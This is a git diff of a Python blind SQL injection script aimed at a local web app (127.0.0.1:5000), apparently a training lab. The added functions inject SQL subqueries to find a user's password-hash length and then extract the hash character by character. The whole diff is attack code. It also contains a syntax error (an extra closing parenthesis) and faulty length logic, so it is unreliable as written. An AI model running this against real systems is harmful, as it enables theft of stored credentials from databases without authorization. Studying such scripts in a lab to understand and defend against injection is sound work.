@@ -2,7 +2,7 @@ import requests
 
 total_queries = 0 
 #extracting hash sums 
-charset = "0123456789abcdef"
+charset = "0123456789abcdefghijklmnopqrstuvwxyz"
 #target IP 
 target = "127.0.0.1:5000"
 #track where we are in the process
@@ -32,3 +32,44 @@ def invalid_user(user_id):
   return injected_payload(payload) 
 
 #length of user password hash 
+#incrementing over how long the hash is
+#guess until it's false 
+def password_len(user_id):
+  i = 0 
+  while True: 
+    payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i) 
+    #start injection and increment guess until it's false
+    #the length is minus one 
+    if not injection_query(payload):
+      return i 
+    i += 1
+
+
+#if user is valid and password hash is present, let's extract the hash
+#iterating through characters in password_length to find the true character
+def extract_hash(charset, user_id, password_length):
+  found = ""
+  for i in range(0, password_length):
+    for j in range(len(charset)):
+      if boolean_query(i, user_id, charset[j])):
+        found += charset[j]
+        break
+  return found 
+
+
+
+#how many queries taken 
+def total_queries_taken():
+  global total_queries
+  print("\t\t [!] {} total queries".format(total_queries)) 
+  #once printed reset the var
+  total_queries = 0 
+
+
+
+
+
+
+  
+
+  
